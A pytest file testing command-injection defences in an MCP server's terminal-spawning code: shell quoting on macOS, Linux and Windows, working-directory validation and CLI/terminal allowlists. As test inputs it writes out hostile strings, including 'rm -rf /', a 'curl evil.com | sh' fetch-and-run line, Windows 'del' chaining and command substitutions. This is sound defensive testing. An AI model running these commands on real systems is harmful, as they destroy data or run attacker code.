"""Tests for terminal command injection prevention (Phase 2: Terminal Injection Cluster).

Covers:
- Task 5: AppleScript/shell escaping in terminal spawn functions (Finding #8)
- Task 6: working_directory validation in spawn_claude_session (Finding #5)
- Task 7: SPELLBOOK_CLI_COMMAND env var allowlist (Finding #13)
- Task 8: $TERMINAL env var allowlist for Linux (Finding #11)
"""

import os
import shlex
import subprocess
import tempfile
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

from spellbook_mcp.terminal_utils import _escape_for_applescript


def _expected_macos_applescript(terminal_type: str, prompt: str, wd: str, cli: str) -> str:
    """Build the expected AppleScript for a given terminal type and inputs.

    This mirrors the production logic: shlex.quote all inputs, build the shell
    command, then AppleScript-escape the result for embedding in a double-quoted
    AppleScript string.
    """
    safe_prompt = shlex.quote(prompt)
    safe_wd = shlex.quote(wd)
    safe_cli = shlex.quote(cli)
    command = f"cd {safe_wd} && {safe_cli} {safe_prompt}"
    as_command = _escape_for_applescript(command)

    if terminal_type == "iterm2":
        return f'''
tell application "iTerm2"
    create window with default profile
    tell current session of current window
        write text "{as_command}"
    end tell
end tell
'''
    elif terminal_type == "warp":
        return f'''
tell application "Warp"
    activate
    tell application "System Events"
        keystroke "t" using {{command down}}
        delay 0.5
        keystroke "{as_command}"
        keystroke return
    end tell
end tell
'''
    else:  # terminal (Terminal.app)
        return f'''
tell application "Terminal"
    do script "{as_command}"
    activate
end tell
'''


def _expected_linux_command(terminal: str, prompt: str, wd: str, cli: str) -> list:
    """Build the expected command list for a given Linux terminal and inputs.

    Mirrors the production logic: shlex.quote all inputs, build the bash -c string.
    """
    safe_prompt = shlex.quote(prompt)
    safe_wd = shlex.quote(wd)
    safe_cli = shlex.quote(cli)
    command = f"cd {safe_wd} && {safe_cli} {safe_prompt}; exec bash"

    if terminal == "gnome-terminal":
        return ["gnome-terminal", "--", "bash", "-c", command]
    elif terminal == "konsole":
        return ["konsole", "-e", "bash", "-c", command]
    elif terminal == "xterm":
        return ["xterm", "-e", "bash", "-c", command]
    elif terminal == "terminator":
        return ["terminator", "-e", f"bash -c {shlex.quote(command)}"]
    elif terminal == "alacritty":
        return ["alacritty", "-e", "bash", "-c", command]
    else:
        return [terminal, "-e", "bash", "-c", command]


class TestAppleScriptEscaping:
    """AppleScript command construction must prevent injection via shlex.quote."""

    def test_subshell_in_prompt_is_escaped(self):
        """A prompt containing $(cmd) must be wrapped in shlex.quote single quotes."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "$(echo pwned)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_semicolon_in_prompt_is_escaped(self):
        """A prompt containing semicolons must be shlex-quoted, preventing command chaining."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = '"; rm -rf / #'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_backtick_in_prompt_is_escaped(self):
        """Backtick command substitution must be neutralized by shlex.quote."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "`rm -rf /`"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_working_directory_is_escaped(self):
        """working_directory with shell metacharacters must be shlex-quoted."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        malicious_wd = '/tmp/$(whoami)'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_macos_terminal(
                terminal="terminal",
                prompt="hello",
                working_directory=malicious_wd,
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("terminal", "hello", malicious_wd, "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "terminal", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_iterm2_uses_escaped_command(self):
        """iTerm2 AppleScript must use the escaped command in write text."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "$(whoami)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=5678)
            result = spawn_macos_terminal(
                terminal="iTerm2",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("iterm2", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "iTerm2", "pid": 5678}
            assert mock_popen.call_count == 1

    def test_warp_uses_escaped_command(self):
        """Warp AppleScript must use the escaped command in keystroke."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        prompt = "; curl evil.com | sh"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=9999)
            result = spawn_macos_terminal(
                terminal="Warp",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            applescript = osascript_cmd[2]

            expected_applescript = _expected_macos_applescript("warp", prompt, "/tmp", "claude")
            assert applescript == expected_applescript
            assert result == {"status": "spawned", "terminal": "Warp", "pid": 9999}
            assert mock_popen.call_count == 1

    def test_popen_called_with_osascript(self):
        """subprocess.Popen must be called with ['osascript', '-e', script]."""
        from spellbook_mcp.terminal_utils import spawn_macos_terminal

        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            spawn_macos_terminal(
                terminal="terminal",
                prompt="safe prompt",
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            osascript_cmd = call_args[0][0]
            expected_applescript = _expected_macos_applescript("terminal", "safe prompt", "/tmp", "claude")
            assert osascript_cmd == ["osascript", "-e", expected_applescript]
            assert call_args[1] == {"stdout": subprocess.PIPE, "stderr": subprocess.PIPE}
            assert mock_popen.call_count == 1


class TestLinuxTerminalEscaping:
    """Linux terminal command construction must use shlex.quote."""

    def test_prompt_is_shell_escaped_gnome(self):
        """User prompt must be escaped with shlex.quote for gnome-terminal bash -c."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        prompt = "$(echo pwned)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="gnome-terminal",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("gnome-terminal", prompt, "/tmp", "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "gnome-terminal", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_working_directory_is_shell_escaped_linux(self):
        """working_directory must be shlex.quote'd in bash -c command."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        malicious_wd = "/tmp/$(id)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="xterm",
                prompt="hello",
                working_directory=malicious_wd,
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("xterm", "hello", malicious_wd, "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "xterm", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_semicolon_in_prompt_escaped_linux(self):
        """Semicolons in prompt must be neutralized by shlex.quote."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        prompt = "; rm -rf / ;"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="konsole",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("konsole", prompt, "/tmp", "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "konsole", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_terminator_double_escapes_command(self):
        """Terminator wraps the bash -c arg in shlex.quote for its -e flag."""
        from spellbook_mcp.terminal_utils import spawn_linux_terminal

        prompt = "$(evil)"
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_linux_terminal(
                terminal="terminator",
                prompt=prompt,
                working_directory="/tmp",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            expected_cmd = _expected_linux_command("terminator", prompt, "/tmp", "claude")
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "terminator", "pid": 1234}
            assert mock_popen.call_count == 1


class TestWindowsTerminalEscaping:
    """Windows terminal command construction must use subprocess.list2cmdline."""

    def test_prompt_with_special_chars_wt(self):
        """Prompt with special characters must be properly escaped for Windows Terminal."""
        from spellbook_mcp.terminal_utils import spawn_windows_terminal

        prompt = 'test & del /f /q *'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_windows_terminal(
                terminal="windows-terminal",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]
            safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])

            expected_cmd = ["wt", "-d", "C:\\Users\\test", "cmd", "/c", safe_cli_prompt]
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "windows-terminal", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_prompt_with_special_chars_pwsh(self):
        """Prompt with special characters must be properly escaped for PowerShell."""
        from spellbook_mcp.terminal_utils import spawn_windows_terminal

        prompt = 'test & del *'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_windows_terminal(
                terminal="pwsh",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]

            # PowerShell uses single-quoted strings (not list2cmdline) to
            # prevent interpretation of $, `, and other PS metacharacters.
            expected_cmd = ["pwsh", "-NoExit", "-Command",
                           "Set-Location 'C:\\Users\\test'; & 'claude' 'test & del *'"]
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "pwsh", "pid": 1234}
            assert mock_popen.call_count == 1

    def test_prompt_with_special_chars_cmd(self):
        """Prompt with special characters must be properly escaped for cmd."""
        from spellbook_mcp.terminal_utils import spawn_windows_terminal

        prompt = 'test & del *'
        with patch("spellbook_mcp.terminal_utils.subprocess.Popen") as mock_popen:
            mock_popen.return_value = MagicMock(pid=1234)
            result = spawn_windows_terminal(
                terminal="cmd",
                prompt=prompt,
                working_directory="C:\\Users\\test",
                cli_command="claude",
            )
            call_args = mock_popen.call_args
            cmd_list = call_args[0][0]
            safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])

            expected_cmd = ["cmd", "/c", "start", "cmd", "/k",
                           f'cd /d "C:\\Users\\test" && {safe_cli_prompt}']
            assert cmd_list == expected_cmd
            assert result == {"status": "spawned", "terminal": "cmd", "pid": 1234}
            assert mock_popen.call_count == 1


class TestWorkingDirectoryValidation:
    """spawn_claude_session must validate working_directory (Finding #5)."""

    def test_rejects_nonexistent_directory(self):
        """working_directory pointing to a nonexistent path must be rejected."""
        from spellbook_mcp.server import _validate_working_directory

        with pytest.raises(ValueError, match="does not exist"):
            _validate_working_directory("/nonexistent/path/xyz", project_path=None)

    def test_rejects_system_directory(self):
        """working_directory=/etc must be rejected (outside $HOME and project)."""
        from spellbook_mcp.server import _validate_working_directory

        with pytest.raises(ValueError, match="outside allowed scope"):
            _validate_working_directory("/etc", project_path=None)

    def test_accepts_home_directory(self):
        """$HOME itself must be accepted."""
        from spellbook_mcp.server import _validate_working_directory

        home = str(Path.home())
        result = _validate_working_directory(home, project_path=None)
        assert result == str(Path(home).resolve())

    def test_accepts_home_subdirectory(self):
        """A real directory under $HOME must be accepted."""
        from spellbook_mcp.server import _validate_working_directory

        # Use a known subdirectory under home
        home = Path.home()
        # Create a temp dir under home for testing
        with tempfile.TemporaryDirectory(dir=str(home)) as tmpdir:
            result = _validate_working_directory(tmpdir, project_path=None)
            assert result == str(Path(tmpdir).resolve())

    def test_accepts_project_subdirectory(self):
        """A directory under the project path must be accepted."""
        from spellbook_mcp.server import _validate_working_directory

        with tempfile.TemporaryDirectory() as tmpdir:
            subdir = os.path.join(tmpdir, "src")
            os.makedirs(subdir)
            result = _validate_working_directory(subdir, project_path=tmpdir)
            assert result == str(Path(subdir).resolve())

    def test_rejects_symlink_escape(self):
        """A symlink pointing outside allowed scope must be rejected after resolution."""
        from spellbook_mcp.server import _validate_working_directory

        with tempfile.TemporaryDirectory() as tmpdir:
            link = os.path.join(tmpdir, "escape")
            os.symlink("/etc", link)
            with pytest.raises(ValueError, match="outside allowed scope"):
                _validate_working_directory(link, project_path=tmpdir)

    def test_rejects_file_not_directory(self):
        """A path that exists but is a file (not a directory) must be rejected."""
        from spellbook_mcp.server import _validate_working_directory

        with tempfile.NamedTemporaryFile() as tmpfile:
            with pytest.raises(ValueError, match="does not exist"):
                _validate_working_directory(tmpfile.name, project_path=None)


class TestCLICommandAllowlist:
    """SPELLBOOK_CLI_COMMAND must be validated against an allowlist (Finding #13)."""

    def test_malicious_cli_command_falls_back_to_claude(self):
        """A CLI command not in the allowlist falls back to 'claude'."""
        from spellbook_mcp.terminal_utils import _get_cli_command

        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "rm -rf /; claude"}):
            result = _get_cli_command()
        assert result == "claude"

    def test_valid_cli_commands_accepted(self):
        """All known CLI commands are accepted."""
        from spellbook_mcp.terminal_utils import _get_cli_command

        for cmd in ["claude", "codex", "gemini", "opencode", "crush"]:
            with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": cmd}):
                result = _get_cli_command()
            assert result == cmd

    def test_path_based_cli_command_extracts_basename(self):
        """A full path to a known CLI is accepted by extracting basename."""
        from spellbook_mcp.terminal_utils import _get_cli_command

        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "/usr/local/bin/claude"}):
            result = _get_cli_command()
        assert result == "claude"

    def test_path_to_unknown_command_falls_back(self):
        """A full path to an unknown command falls back to 'claude'."""
        from spellbook_mcp.terminal_utils import _get_cli_command

        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "/usr/local/bin/evil"}):
            result = _get_cli_command()
        assert result == "claude"

    def test_default_is_claude(self):
        """Without env var, default is 'claude'."""
        from spellbook_mcp.terminal_utils import _get_cli_command

        env = os.environ.copy()
        env.pop("SPELLBOOK_CLI_COMMAND", None)
        with patch.dict(os.environ, env, clear=True):
            result = _get_cli_command()
        assert result == "claude"

    def test_spawn_terminal_window_uses_validated_cli(self):
        """spawn_terminal_window must use _get_cli_command when cli_command is None."""
        from spellbook_mcp.terminal_utils import spawn_terminal_window, _get_cli_command

        with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "codex"}):
            with patch("spellbook_mcp.terminal_utils.spawn_macos_terminal") as mock_spawn:
                with patch("sys.platform", "darwin"):
                    mock_spawn.return_value = {"status": "spawned", "terminal": "t", "pid": 1}
                    spawn_terminal_window("terminal", "hello", "/tmp")
                    # cli_command should be the validated value from _get_cli_command
                    mock_spawn.assert_called_once_with("terminal", "hello", "/tmp", "codex")


class TestTerminalEnvAllowlist:
    """$TERMINAL env var must be validated via shutil.which (Finding #11)."""

    def test_malicious_terminal_rejected(self):
        """An unknown $TERMINAL value that doesn't exist on PATH must be ignored."""
        from spellbook_mcp.terminal_utils import detect_linux_terminal

        with patch.dict(os.environ, {"TERMINAL": "/tmp/evil"}):
            with patch("shutil.which", return_value=None):
                with patch("spellbook_mcp.terminal_utils.subprocess.run") as mock_run:
                    # Make the fallback detection also find nothing
                    mock_run.return_value = MagicMock(returncode=1)
                    result = detect_linux_terminal()
        # Must NOT return the malicious value; should fall through to detection
        assert result == "xterm"  # final fallback

    def test_known_terminal_in_env_accepted(self):
        """A known terminal in $TERMINAL that exists via which() must be accepted."""
        from spellbook_mcp.terminal_utils import detect_linux_terminal

        with patch.dict(os.environ, {"TERMINAL": "alacritty"}):
            with patch("shutil.which", return_value="/usr/bin/alacritty"):
                result = detect_linux_terminal()
        assert result == "alacritty"

    def test_full_path_to_known_terminal_accepted(self):
        """$TERMINAL=/usr/bin/gnome-terminal extracts basename and validates."""
        from spellbook_mcp.terminal_utils import detect_linux_terminal

        with patch.dict(os.environ, {"TERMINAL": "/usr/bin/gnome-terminal"}):
            with patch("shutil.which", return_value="/usr/bin/gnome-terminal"):
                result = detect_linux_terminal()
        assert result == "gnome-terminal"

    def test_terminal_not_on_path_falls_through(self):
        """Even a reasonable-looking $TERMINAL must be rejected if which() fails."""
        from spellbook_mcp.terminal_utils import detect_linux_terminal

        with patch.dict(os.environ, {"TERMINAL": "kitty"}):
            with patch("shutil.which", return_value=None):
                with patch("spellbook_mcp.terminal_utils.subprocess.run") as mock_run:
                    # gnome-terminal found in fallback cascade
                    def run_side_effect(cmd, **kwargs):
                        if 'gnome-terminal' in cmd:
                            return MagicMock(returncode=0)
                        return MagicMock(returncode=1)
                    mock_run.side_effect = run_side_effect
                    result = detect_linux_terminal()
        assert result == "gnome-terminal"

    def test_empty_terminal_env_uses_detection_cascade(self):
        """An empty $TERMINAL value must be treated as unset and use detection cascade."""
        from spellbook_mcp.terminal_utils import detect_linux_terminal

        with patch.dict(os.environ, {"TERMINAL": ""}):
            with patch("spellbook_mcp.terminal_utils.subprocess.run") as mock_run:
                def run_side_effect(cmd, **kwargs):
                    if 'konsole' in cmd:
                        return MagicMock(returncode=0)
                    return MagicMock(returncode=1)
                mock_run.side_effect = run_side_effect
                result = detect_linux_terminal()
        assert result == "konsole"

    def test_no_terminal_env_uses_detection_cascade(self):
        """Without $TERMINAL set, detection cascade runs normally."""
        from spellbook_mcp.terminal_utils import detect_linux_terminal

        env = os.environ.copy()
        env.pop("TERMINAL", None)
        with patch.dict(os.environ, env, clear=True):
            with patch("spellbook_mcp.terminal_utils.subprocess.run") as mock_run:
                def run_side_effect(cmd, **kwargs):
                    if 'konsole' in cmd:
                        return MagicMock(returncode=0)
                    return MagicMock(returncode=1)
                mock_run.side_effect = run_side_effect
                result = detect_linux_terminal()
        assert result == "konsole"
